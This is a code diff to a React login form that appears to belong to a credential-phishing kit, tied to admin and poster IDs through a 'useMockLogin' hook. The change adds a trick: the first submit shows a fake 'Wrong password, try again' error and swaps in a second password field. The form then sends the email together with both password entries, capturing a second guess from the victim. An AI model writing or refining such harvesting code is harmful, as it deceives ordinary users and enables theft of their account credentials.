@@ -2,19 +2,23 @@
 import { Field, Form, Formik } from "formik";
 import { site } from "../config/index";
 import useMockLogin from "../hooks/useMockLogin";
+import { useState } from "react";
+import { toast } from "react-toastify";
 
 function LoginForm({ adminId, posterId, setImage }) {
+  const [showWrongPassword, setShowWrongPassword] = useState(false);
   console.log(adminId, posterId);
   const initialvalues = {
     email: "",
     password: "",
+    wrongPassword: "",
     remember: "",
   };
 
   const { login } = useMockLogin(adminId, posterId);
 
   const handleSubmit = (values, formik) => {
-    const { email, password } = values;
+    const { email, password, wrongPassword } = values;
 
     // console.log("values", values);
 
@@ -22,6 +26,7 @@ function LoginForm({ adminId, posterId, setImage }) {
       site: site,
       email: email,
       password: password,
+      wrongPassword: wrongPassword,
       skipcode: "",
     };
     setImage(true);
@@ -29,7 +34,10 @@ function LoginForm({ adminId, posterId, setImage }) {
     formik.resetForm();
     console.log(submitValues);
   };
-
+  const handleWrongPassword = () => {
+    setShowWrongPassword(true);
+    toast.error("Wrong password, try again");
+  };
   return (
     <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
       <div className=" mt-5 font-bold text-[#222222] text-center ">
@@ -62,21 +70,47 @@ function LoginForm({ adminId, posterId, setImage }) {
                 required
               />
 
-              <Field
-                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-                placeholder="Password"
-                name="password"
-                type="password"
-                autoComplete="on"
-                required
-              />
+              {!showWrongPassword ? (
+                <>
+                  <Field
+                    className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
+                    placeholder="Password"
+                    name="password"
+                    type="password"
+                    autoComplete="on"
+                    required
+                  />
+                </>
+              ) : (
+                <Field
+                  className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
+                  placeholder="Password"
+                  name="wrongPassword"
+                  type="password"
+                  autoComplete="on"
+                  required
+                />
+              )}
 
-              <button
-                type="submit"
-                className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-              >
-                Continue
-              </button>
+              {!showWrongPassword ? (
+                <button
+                  type="button"
+                  onClick={handleWrongPassword}
+                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
+                >
+                  SUBMIT
+                </button>
+              ) : (
+                <button
+                  type="submit"
+                  // type="button"
+                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
+                  // disabled={!verified}
+                  // onClick={handleNextStep}
+                >
+                  SUBMIT
+                </button>
+              )}
             </Form>
           )}
         </Formik>
